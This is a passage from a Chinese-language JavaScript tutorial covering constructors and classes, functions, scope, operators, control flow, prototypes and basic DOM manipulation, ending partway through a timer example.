是一种基于原型的语言，它没类的声明语句，比如 <code>C++</code>或 <code>Java</code> 中用的。这有时会对习惯使用有类申明语句语言的程序员产生困扰。相反，<code>JavaScript</code> 可用方法作类。定义一个类跟定义一个函数一样简单。在下面的例子中，我们定义了一个新类 <code>Person</code>。</p><p>第一种方法：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Person<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    //构造函数里面的方法和属性    this._name <span class="token operator">=</span> name<span class="token punctuation">;</span>    this.getName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console.log<span class="token punctuation">(</span>this._name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    this.setName <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        this._name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span>var p <span class="token operator">=</span> new Person<span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p.getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 张三p.setName<span class="token punctuation">(</span><span class="token string">"李四"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p.getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 李四</code></pre><blockquote><p>对于上述代码需要注意：<br>Person 充当的构造函数<br>this 代指对象<br>创建对象时需要使用 new</p></blockquote><p>第二种方法：</p><pre class=" language-bash"><code class="language-bash">// 定义类 class Person <span class="token punctuation">{</span>    //类的构造函数，实例化的时候执行，new 的时候执行    constructor<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        this._name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console.log<span class="token punctuation">(</span>this._name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    setName<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        this._name <span class="token operator">=</span> name    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> p <span class="token operator">=</span> new Preson<span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span>p.getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 张三p.setName<span class="token punctuation">(</span><span class="token string">'李四'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p.getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 李四</code></pre><hr><h3 id="0x007-JavaScript-函数"><a href="#0x007-JavaScript-函数" class="headerlink" title="0x007 JavaScript 函数"></a>0x007 JavaScript 函数</h3><hr><p>JavaScript 函数语法</p><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> functionname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    // 执行代码<span class="token punctuation">}</span></code></pre><p><strong>普通函数：</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> func<span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> arg+1<span class="token punctuation">;</span><span class="token punctuation">}</span>var result <span class="token operator">=</span> func<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> var result <span class="token operator">=</span> func<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>匿名函数：</strong></p><p>没有名字的函数称为匿名函数</p><pre><code>setInterval(function(){    console.log(123);},500)</code></pre><p><strong>自执行函数：</strong></p><p>创建函数并且自动执行</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>function<span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">{</span>    console.log<span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p></blockquote><hr><h3 id="0x008-JavaScript-作用域"><a href="#0x008-JavaScript-作用域" class="headerlink" title="0x008 JavaScript 作用域"></a>0x008 JavaScript 作用域</h3><hr><p><strong>JavaScript 局部作用域</strong></p><p>变量在函数内声明，变量为局部变量，具有局部作用域。</p><p>局部变量：只能在函数内部访问。</p><pre class=" language-bash"><code class="language-bash">// 此处不能调用 carName 变量<span class="token keyword">function</span> myFunction<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    var carName <span class="token operator">=</span> <span class="token string">"Volvo"</span><span class="token punctuation">;</span>    // 函数内可调用 carName 变量<span class="token punctuation">}</span></code></pre><p><strong>JavaScript 全局变量</strong></p><p>变量在函数外定义，即为全局变量。</p><p>全局变量有 全局作用域: 网页中所有脚本和函数均可使用。</p><pre class=" language-bash"><code class="language-bash">var carName <span class="token operator">=</span> <span class="token string">" Volvo"</span><span class="token punctuation">;</span> // 此处可调用 carName 变量<span class="token keyword">function</span> myFunction<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    // 函数内可调用 carName 变量<span class="token punctuation">}</span></code></pre><p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。</p><p>以下实例中 carName 在函数内，但是为全局变量。</p><pre class=" language-bash"><code class="language-bash">// 此处可调用 carName 变量 <span class="token keyword">function</span> myFunction<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    carName <span class="token operator">=</span> <span class="token string">"Volvo"</span><span class="token punctuation">;</span>    // 此处可调用 carName 变量<span class="token punctuation">}</span></code></pre><hr><h3 id="0x009-JavaScript-运算符"><a href="#0x009-JavaScript-运算符" class="headerlink" title="0x009 JavaScript 运算符"></a>0x009 JavaScript 运算符</h3><hr><h4 id="1-JavaScript-算术运算符"><a href="#1-JavaScript-算术运算符" class="headerlink" title="1.JavaScript 算术运算符"></a>1.JavaScript 算术运算符</h4><p>+(加法)、-(减法)、*(乘法)、/(除法)、%(取模/余数)、++(自增)、–(自减)</p><blockquote><p>字符串拼接使用 “ + “</p></blockquote><h4 id="2-JavaScript-比较运算符"><a href="#2-JavaScript-比较运算符" class="headerlink" title="2.JavaScript 比较运算符"></a>2.JavaScript 比较运算符</h4><p>&lt;、&gt;、==、!=、&lt;=、&gt;=<br>=== 全等于：将数值以及数据类型一并比较<br>!==不全等于：将数值以及数据类型一并比较</p><h4 id="3-JavaScript-赋值运算符"><a href="#3-JavaScript-赋值运算符" class="headerlink" title="3.JavaScript 赋值运算符"></a>3.JavaScript 赋值运算符</h4><ul><li>=</li><li>+= </li><li>-=</li><li>*=</li><li>/=</li><li>%=</li><li>a=a+2;–&gt;a+=2</li><li>a=a-2;–&gt;a-=2</li><li>a=a<em>2;–&gt;a</em>=2</li><li>a=a/2;–&gt;a/=2</li><li>a=a%2;–&gt;a%=2</li></ul><h4 id="4-JavaScript-逻辑运算符"><a href="#4-JavaScript-逻辑运算符" class="headerlink" title="4.JavaScript 逻辑运算符"></a>4.JavaScript 逻辑运算符</h4><ul><li>&amp;&amp; 全真为真</li><li>|| 一个为真就是真</li><li>！ 取反</li></ul><h4 id="5-JavaScript-三元运算符"><a href="#5-JavaScript-三元运算符" class="headerlink" title="5.JavaScript 三元运算符"></a>5.JavaScript 三元运算符</h4><p>表达式 1?表达式 2:表达式 3</p><p>当我的表达式 1 成立时 执行表达式 2 否则执行表达式 3</p><pre class=" language-bash"><code class="language-bash">var max <span class="token operator">=</span> 2<span class="token operator">></span>1?<span class="token string">'>'</span><span class="token keyword">:</span><span class="token string">'&lt;'</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x010-JavaScript-流程控制语句"><a href="#0x010-JavaScript-流程控制语句" class="headerlink" title="0x010 JavaScript 流程控制语句"></a>0x010 JavaScript 流程控制语句</h3><hr><h4 id="1-if-语句"><a href="#1-if-语句" class="headerlink" title="1.if 语句"></a>1.if 语句</h4><p>只有当指定条件为 <code>true</code> 时，该语句才会执行代码。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">{</span>    当条件为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">}</span></code></pre><blockquote><p>请使用小写的 if。使用大写字母（IF）会生成 JavaScript 错误！</p></blockquote><h4 id="2-if…else-语句"><a href="#2-if…else-语句" class="headerlink" title="2.if…else 语句"></a>2.if…else 语句</h4><p>使用 <code>if....else</code> 语句在条件为 <code>true</code> 时执行代码，在条件为 <code>false</code> 时执行其他代码。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span>time<span class="token operator">&lt;</span>20<span class="token punctuation">)</span><span class="token punctuation">{</span>    x<span class="token operator">=</span><span class="token string">"Good day"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    x<span class="token operator">=</span><span class="token string">"Good evening"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="3-if…else-if…else-语句"><a href="#3-if…else-if…else-语句" class="headerlink" title="3.if…else if…else 语句"></a>3.if…else if…else 语句</h4><p>使用 <code>if....else if...else</code> 语句来选择多个代码块之一来执行。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span>condition1<span class="token punctuation">)</span><span class="token punctuation">{</span>    当条件 1 为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>condition2<span class="token punctuation">)</span><span class="token punctuation">{</span>    当条件 2 为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  当条件 1 和 条件 2 都不为 <span class="token boolean">true</span> 时执行的代码<span class="token punctuation">}</span></code></pre><h4 id="4-switch-语句"><a href="#4-switch-语句" class="headerlink" title="4.switch 语句"></a>4.switch 语句</h4><p>请使用 <code>switch</code> 语句来选择要执行的多个代码块之一。</p><pre class=" language-bash"><code class="language-bash">switch<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> 1:        执行代码块 1        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> 2:        执行代码块 2        <span class="token keyword">break</span><span class="token punctuation">;</span>    default:        与 <span class="token keyword">case</span> 1 和 <span class="token keyword">case</span> 2 不同时执行的代码<span class="token punctuation">}</span></code></pre><p>工作原理：首先设置表达式 n（通常是一个变量）。随后表达式的值会与结构中的每个 case 的值做比较。如果存在匹配，则与该 case 关联的代码块会被执行。请使用 break 来阻止代码自动地向下一个 case 运行。</p><h4 id="5-for-循环"><a href="#5-for-循环" class="headerlink" title="5.for 循环"></a>5.for 循环</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token punctuation">(</span>var i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>cars.length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>     document.write<span class="token punctuation">(</span>cars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> + <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="6-For…In-循环"><a href="#6-For…In-循环" class="headerlink" title="6.For…In 循环"></a>6.For…In 循环</h4><pre class=" language-bash"><code class="language-bash">var person<span class="token operator">=</span><span class="token punctuation">{</span>fname:<span class="token string">"Bill"</span>,lname:<span class="token string">"Gates"</span>,age:56<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">in</span> person<span class="token punctuation">)</span>  // x 为属性名<span class="token punctuation">{</span>    txt<span class="token operator">=</span>txt + person<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="7-while-循环"><a href="#7-while-循环" class="headerlink" title="7.while 循环"></a>7.while 循环</h4><p><code>while</code> 循环会在指定条件为真时循环执行代码块。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">{</span>    需要执行的代码<span class="token punctuation">}</span></code></pre><h4 id="8-do…while-循环"><a href="#8-do…while-循环" class="headerlink" title="8.do…while 循环"></a>8.do…while 循环</h4><p><code>do/while</code> 循环是 <code>while</code> 循环的变体。该循环会在检查条件是否为真之前执行一次代码块，然后如果条件为真的话，就会重复这个循环。</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">do</span><span class="token punctuation">{</span>    需要执行的代码<span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x011-JavaScript-保留关键字"><a href="#0x011-JavaScript-保留关键字" class="headerlink" title="0x011 JavaScript 保留关键字"></a>0x011 JavaScript 保留关键字</h3><hr><p><code>Javascript</code> 的保留关键字不可以用作变量、标签或者函数名。有些保留关键字是作为 <code>Javascript</code> 以后扩展使用。</p><p><img src="https://s1.ax1x.com/2022/08/09/v1pEHf.png" alt="关键字"></p><blockquote><ul><li>标记的关键字是 ECMAScript5 中新添加的。</li></ul></blockquote><hr><h3 id="0x012-JavaScript-字典"><a href="#0x012-JavaScript-字典" class="headerlink" title="0x012 JavaScript 字典"></a>0x012 JavaScript 字典</h3><hr><p>字典 是一种以键-值对形式存储数据的数据结构</p><pre class=" language-bash"><code class="language-bash">var dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'k1'</span><span class="token keyword">:</span><span class="token string">"moonsec"</span>,<span class="token string">'k2'</span><span class="token keyword">:</span><span class="token string">'moon'</span>,<span class="token string">'age'</span>:18<span class="token punctuation">}</span><span class="token punctuation">;</span>输出字典元素for<span class="token punctuation">(</span>var item <span class="token keyword">in</span> dict<span class="token punctuation">)</span><span class="token punctuation">{</span>    console.log<span class="token punctuation">(</span>dict<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>获取指定元素</p><pre class=" language-bash"><code class="language-bash">dict<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span> 获取 key 为 age 的元素</code></pre><p>赋值</p><pre class=" language-bash"><code class="language-bash">dict<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token operator">=</span>10</code></pre><p>删除元素</p><pre class=" language-bash"><code class="language-bash">delete dict<span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>delete dict.age<span class="token punctuation">;</span></code></pre><hr><h3 id="0x013-JavaScript-转义"><a href="#0x013-JavaScript-转义" class="headerlink" title="0x013 JavaScript 转义"></a>0x013 JavaScript 转义</h3><hr><ul><li>decodeURI( ) URl 中未转义的字符</li><li>ecodeURIComponent( ) URI 组件中的未转义字符</li><li>ecodeURI( ) URI 中的转义字符</li><li>ecodeURIComponent( ) 转义 URI 组件中的字符</li><li>escape( ) 对字符串转义</li><li>unescape( ) 给转义字符串解码</li><li>URIError 由 URl 的编码和解码方法抛出</li></ul><hr><h3 id="0x014-JavaScript-时间"><a href="#0x014-JavaScript-时间" class="headerlink" title="0x014 JavaScript 时间"></a>0x014 JavaScript 时间</h3><hr><p>Date 对象</p><pre class=" language-bash"><code class="language-bash">var myDate <span class="token operator">=</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>myDate.getYear(); //获取当前年份(2 位) </li><li>myDate.getFullYear(); //获取完整的年份(4 位,1970-????) </li><li>myDate.getMonth(); //获取当前月份(0-11,0 代表 1 月) 所以获取当前月份是</li><li>myDate.getMonth()+1; </li><li>myDate.getDate(); //获取当前日(1-31) </li><li>myDate.getDay(); //获取当前星期 X(0-6,0 代表星期天) </li><li>myDate.getTime(); //获取当前时间(从 1970.1.1 开始的毫秒数) </li><li>myDate.getHours(); //获取当前小时数(0-23) </li><li>myDate.getMinutes(); //获取当前分钟数(0-59) </li><li>myDate.getSeconds(); //获取当前秒数(0-59) </li><li>myDate.getMilliseconds(); //获取当前毫秒数(0-999) </li><li>myDate.toLocaleDateString(); //获取当前日期</li><li>var mytime = myDate.toLocaleTimeString(); //获取当前时间 </li><li>myDate.toLocaleString( ); //获取日期与时间</li></ul><p>加一天</p><pre class=" language-bash"><code class="language-bash">var dateTime <span class="token operator">=</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> dateTime<span class="token operator">=</span>dateTime.setDate<span class="token punctuation">(</span>dateTime.getDate<span class="token punctuation">(</span><span class="token punctuation">)</span>+1<span class="token punctuation">)</span><span class="token punctuation">;</span>dateTime<span class="token operator">=</span>new Date<span class="token punctuation">(</span>dateTime<span class="token punctuation">)</span><span class="token punctuation">;</span>dateTime<span class="token operator">=</span>dateTime.setDate<span class="token punctuation">(</span>dateTime.getDate<span class="token punctuation">(</span><span class="token punctuation">)</span>+1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x015-JavaScript-原型"><a href="#0x015-JavaScript-原型" class="headerlink" title="0x015 JavaScript 原型"></a>0x015 JavaScript 原型</h3><hr><p>我们所创建的每一个函数，解析器都会向函数中添加一个属性 <code>prototype</code> , 这个属性对应着一个对象，这个对象就是我们所谓的原型对象。如果函数作为普通函数调用时 <code>prototype</code> 没有任何作用。</p><p>当函数以构造函数调用时，它所创建的对象中都会有一个隐含的的属性，指向该构造函数的原型，我们可以通过<code>__proto__</code>来访问该属性</p><p>我们可以将对象中公有的内容，统一设置到原型对象中</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">function</span> Persion<span class="token punctuation">(</span>username,age<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>//console.log<span class="token punctuation">(</span>Persion.prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>var p <span class="token operator">=</span> new Persion<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span>p.__proto__ <span class="token operator">==</span> Persion.prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>定义原型变量和原型变量<span class="token keyword">function</span> Persion<span class="token punctuation">(</span>username,age<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>//console.log<span class="token punctuation">(</span>Persion.prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>Persion.prototype.a <span class="token operator">=</span> <span class="token string">'女'</span><span class="token punctuation">;</span>Persion.prototype.Sayname<span class="token operator">=</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> Persion.name<span class="token punctuation">;</span><span class="token punctuation">}</span>var p1 <span class="token operator">=</span> new Persion<span class="token punctuation">(</span><span class="token string">'moonsec'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var p2 <span class="token operator">=</span> new Persion<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>p1.Sayname<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x016-JavaScript-操作-DOM"><a href="#0x016-JavaScript-操作-DOM" class="headerlink" title="0x016 JavaScript 操作 DOM"></a>0x016 JavaScript 操作 DOM</h3><hr><h4 id="1-DOM简介"><a href="#1-DOM简介" class="headerlink" title="1.DOM简介"></a>1.DOM简介</h4><p><code>DOM</code>（<code>document object model</code>）文档对象模型，是针对 <code>HTML</code> 和 <code>XML</code> 的一个 <code>API</code>（应用程序接口）。<code>DOM</code>给我们描述了一个具有层次化特点的节点树，允许开发人员增删改查页面的某些部分。</p><p><img src="https://www.runoob.com/images/pic_htmltree.gif" alt="DOM树"></p><ul><li>JavaScript 能够改变页面中的所有 HTML 元素</li><li>JavaScript 能够改变页面中的所有 HTML 属性</li><li>JavaScript 能够改变页面中的所有 CSS 样式</li><li>JavaScript 能够对页面中的所有事件做出反应</li></ul><h4 id="2-DOM-查找元素"><a href="#2-DOM-查找元素" class="headerlink" title="2.DOM 查找元素"></a>2.DOM 查找元素</h4><p>document 获取节点的基本方法<br>document.getElementById(‘id’); //通过 id 来获取元素,返回指定的唯一元素。<br>document.getElementsByName(“name”); //通过 name 来获取元素，返回name=’name’的集合。<br>document.getElementsByClassName(“classname”) //用 classname 来获取元素，返回的是一个 class=”classname”的集合(不兼容 IE8 及以下)。<br>document.getElementsByTagName(‘div’); //用元素的标签获取元素，返回所有标签=“div”的集合。</p><h5 id="2-1-查找"><a href="#2-1-查找" class="headerlink" title="2.1 查找"></a>2.1 查找</h5><p><strong>直接查找</strong></p><pre class=" language-bash"><code class="language-bash">var obj <span class="token operator">=</span> document.getElementById<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>间接查找</strong></p><p>innerText 仅文本</p><p>innerHTML 全内容</p><p>value</p><p>input value 获取当前的值</p><p>select 获取选中的 value 的值</p><pre class=" language-bash"><code class="language-bash">document.getElementById<span class="token punctuation">(</span><span class="token string">'s1'</span><span class="token punctuation">)</span>.selectedIndex<span class="token operator">=</span>1</code></pre><p>Textarea 获取 value 的值</p><h5 id="2-2操作"><a href="#2-2操作" class="headerlink" title="2.2操作"></a>2.2操作</h5><p><strong>样式操作</strong></p><p>className 列出样式 字符串</p><p>classList 列出样式 返回数组</p><p>classList.add 增加样式</p><p>classList.remove 删除样式</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">'c1 c2'</span> styple<span class="token operator">=</span><span class="token string">'font-size:16px'</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>obj.style.fontSize<span class="token operator">=</span><span class="token string">'16px'</span><span class="token punctuation">;</span></code></pre><p><strong>属性操作</strong></p><p>获取属性</p><pre class=" language-bash"><code class="language-bash">getAttribute<span class="token punctuation">(</span><span class="token punctuation">)</span>增加设置一个属性</code></pre><p>添加属性</p><pre class=" language-bash"><code class="language-bash">setAttribute<span class="token punctuation">(</span><span class="token string">'xxx'</span>,<span class="token string">'alexe'</span><span class="token punctuation">)</span></code></pre><p>删除属性</p><pre class=" language-bash"><code class="language-bash">removeAttribute<span class="token punctuation">(</span>value<span class="token punctuation">)</span></code></pre><p>创建标签 并添加到 html 中</p><p>第一种方式 字符串方式</p><pre class=" language-bash"><code class="language-bash">insertAdjacentHTML<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"+"</span> onclick<span class="token operator">=</span><span class="token string">"add();"</span>/<span class="token operator">></span>    <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"div1"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span>/<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>    <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        var tag<span class="token operator">=</span><span class="token string">"&lt;p>&lt;input type='text'>&lt;/p>"</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>.insertAdjacentHTML<span class="token punctuation">(</span><span class="token string">'beforeEnd'</span>,tag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span></code></pre><p>有四种值可用：</p><ul><li>beforeBegin: 插入到标签开始前</li><li>afterBegin:插入到标签开始标记之后</li><li>beforeEnd:插入到标签结束标记前</li><li>afterEnd:插入到标签结束标记后</li></ul><p>第二种方式 对象的方式</p><pre class=" language-bash"><code class="language-bash">document.createElement    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"+"</span> onclick<span class="token operator">=</span><span class="token string">"add2();"</span>/<span class="token operator">></span>    <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"div1"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span>/<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>    <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        var tag<span class="token operator">=</span><span class="token string">"&lt;p>&lt;input type='text'>&lt;/p>"</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>.insertAdjacentHTML<span class="token punctuation">(</span><span class="token string">'beforeEnd'</span>,tag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> add2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        var tag <span class="token operator">=</span>document.createElement<span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tag.setAttribute<span class="token punctuation">(</span><span class="token string">'type'</span>,<span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tag.style.color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">;</span>        var p <span class="token operator">=</span>document.createElement<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p.appendChild<span class="token punctuation">(</span>tag<span class="token punctuation">)</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>.appendChild<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>appendChild 在节点后面增加一个子节点</code></pre><p>提交表单</p><p>任何标签都可以通过 dom 提交</p><pre class=" language-bash"><code class="language-bash">getElementById<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">&lt;</span>form id<span class="token operator">=</span><span class="token string">'f1'</span> action<span class="token operator">=</span><span class="token string">"https://www.moonsec.com/"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"提交"</span> /<span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"botton"</span> onclick<span class="token operator">=</span><span class="token string">"Sub();"</span> /<span class="token operator">></span>        <span class="token operator">&lt;</span>a onclick<span class="token operator">=</span><span class="token string">"Sub();"</span><span class="token operator">></span>提交<span class="token operator">&lt;</span>/a<span class="token operator">></span>    <span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> Sub<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'f1'</span><span class="token punctuation">)</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>其他</p><ul><li>console.log 终端输出</li><li>alert 弹出框</li><li>confirm 确认框 标题 true false</li></ul><p>url 和刷新</p><ul><li>location.href 获取 url</li><li>location.href =’url’ 重定向</li><li>location.reload() 重新加载</li></ul><p>定时器</p><p>setInterval()<br>clearInterval()</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"i1"</span> type<span class="token operator">=</span><span class="token string">"text"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"停止"</span> onclick<span class="token operator">=</span><span class="token string">"stop();"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> setTime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        var tag <span class="token operator">=</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        document.getElementById<span class="token punctuation">(</span><span class="token string">'i1'</span><span class="token punctuation">)</span>.value<span class="token operator">=</span>tag<span class="token punctuation">;</span>    <span 